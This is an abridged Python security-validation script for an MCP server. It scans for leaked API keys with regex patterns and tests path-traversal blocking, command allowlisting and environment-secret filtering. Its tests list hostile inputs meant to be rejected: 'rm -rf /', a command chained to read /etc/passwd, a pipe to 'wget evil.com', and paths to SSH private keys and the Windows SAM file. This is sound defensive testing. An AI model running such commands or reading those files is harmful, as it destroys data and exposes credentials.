...
CREDENTIAL_PATTERNS = [
    (r"ctx7sk-[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}", "Context7 API Key"),
    (r"ghp_[A-Za-z0-9]{36}", "GitHub Personal Access Token"),
    (r"pk_[0-9]+_[A-Za-z0-9]{40}", "ClickUp API Token"),
    (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
    (r"sk-[A-Za-z0-9]{48}", "OpenAI API Key"),
    (r'["\']?[A-Za-z0-9_]*[Kk][Ee][Yy]["\']?\s*[:=]\s*["\'][A-Za-z0-9/+]{20,}["\']', "Generic API Key"),
    (r'["\']?[A-Za-z0-9_]*[Tt][Oo][Kk][Ee][Nn]["\']?\s*[:=]\s*["\'][A-Za-z0-9/+]{20,}["\']', "Generic Token"),
    (r'["\']?[A-Za-z0-9_]*[Ss][Ee][Cc][Rr][Ee][Tt]["\']?\s*[:=]\s*["\'][A-Za-z0-9/+]{20,}["\']', "Generic Secret"),
]

# Files to exclude from credential scanning
EXCLUDE_PATTERNS = [
    r"\.git/", r"__pycache__/", r"\.pyc$", r"node_modules/",
    r"\.env\.example$", r"security_check\.py$"
]

# Safe placeholder patterns
SAFE_PATTERNS = [
    r"your_.*_here", r"your_.*_token", r"your_.*_key", 
    r"placeholder", r"example_.*", r"fake_.*", r"test_.*_key", r"dummy_.*"
]
...
def import_security_modules():
    ...
    try:
        from mcp_server.utils.security import (
            safe_read_file, safe_write_file, run_command,
            validate_file_path, filter_sensitive_environment,
            get_security_config, _validate_command_security,
            _is_path_allowed, _is_path_forbidden,
        )
...
def test_path_traversal_protection(security_funcs):
    ...
    dangerous_paths = [
        ...
        "~/.ssh/id_rsa", "C:\\Windows\\System32\\config\\SAM"
    ]
    ...
    for path in dangerous_paths:
        try:
            ...
            if any(x in str(e) for x in ["Access denied", "outside allowed directories", "Invalid file path"]):
    ...
    if success:
        print(f"✅ Path traversal protection working ({success_count}/{len(dangerous_paths)} blocked)")
    else:
        print(f"❌ Insufficient path protection ({success_count}/{len(dangerous_paths)} blocked)")
    return success
...
def test_command_validation(security_funcs):
    ...
    invalid_commands = ["rm -rf /", "ls && cat /etc/passwd", "echo hello | wget evil.com", "malicious_command"]
    
    valid_count = sum(1 for cmd in valid_commands if security_funcs['_validate_command_security'](cmd)["valid"])
    invalid_count = sum(1 for cmd in invalid_commands if not security_funcs['_validate_command_security'](cmd)["valid"])
    ...
    success = valid_count == len(valid_commands) and invalid_count == len(invalid_commands)
    if success:
        print("✅ Command validation working correctly")
    else:
        print(f"❌ Command validation issues (valid: {valid_count}/{len(valid_commands)}, invalid: {invalid_count}/{len(invalid_commands)})")
    return success
...
def test_environment_filtering(security_funcs):
    ...
    test_vars = {
        "TEST_API_KEY": "secret123", "TEST_SECRET": "supersecret", 
        "TEST_PASSWORD": "password123", "TEST_SAFE_VAR": "safe_value", "ANOTHER_SAFE": "also_safe"
    }
    ...
    try:
        ...
        safe_retained = sum(1 for var in safe_vars if var in filtered_env and filtered_env[var] == test_vars[var])
        ...
        for var in safe_vars:
            status = "✅" if var in filtered_env and filtered_env[var] == test_vars[var] else "❌"
            print(f"{status} Safe variable retained: {var}")
        
        success = sensitive_filtered == len(sensitive_vars) and safe_retained == len(safe_vars)
        if success:
...
def test_file_size_protection(security_funcs):
    ...
    try:
        ...
        try:
            ...
            print("✅ File reading with sufficient limit works" if size_test_1 else "❌ File reading returned wrong length")
        ...
        try:
            ...
            print("✅ File size limit enforced correctly" if size_test_2 else f"⚠️ Unexpected error: {e}")
        except Exception as e:
...
def test_security_configuration(security_funcs):
    ...
    try:
        ...
        required_keys = ["allowed_commands", "hardening_enabled", "security_version", "command_allowlist_active", "path_validation_active"]
...
def test_path_validation_functions(security_funcs):
    ...
    try:
        ...
        print("✅ Current directory path correctly allowed" if allowed_test else "❌ Current directory path incorrectly blocked")
    except Exception as e:
...
def scan_credentials(root_path="."):
    ...
    for root, dirs, files in os.walk(root_path):
        ...
        for file in files:
            ...
            if file_path.suffix.lower() in [".py", ".md", ".txt", ".json", ".yaml", ".yml", ".env", ".cfg", ".ini", ".sh", ".bat"]:
...
def run_security_validation():
    ...
    # Run security tests
    tests = [
        ("Path Traversal Protection", lambda: test_path_traversal_protection(security_funcs)),
        ...
        ("Path Validation Functions", lambda: test_path_validation_functions(security_funcs)),
    ]
...
def main():
    ...
    parser = argparse.ArgumentParser(description="Comprehensive Security Check for MCP Server")
    parser.add_argument("--quick", action="store_true", help="Skip credential scanning")
    parser.add_argument("--scan", action="store_true", help="Only run credential scanning")
